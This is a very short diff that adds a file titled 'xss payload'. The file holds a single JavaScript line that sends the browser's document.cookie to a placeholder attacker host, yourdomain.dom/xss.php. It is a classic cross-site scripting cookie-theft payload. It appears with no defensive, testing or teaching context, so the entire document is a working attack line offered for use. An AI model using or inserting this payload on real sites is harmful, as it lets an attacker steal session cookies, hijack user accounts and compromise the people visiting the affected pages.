@@ -1,0 +1,3 @@
+xss payload 
+
+document.location='http://yourdomain.dom/xss.php?cok='+document.cookie;
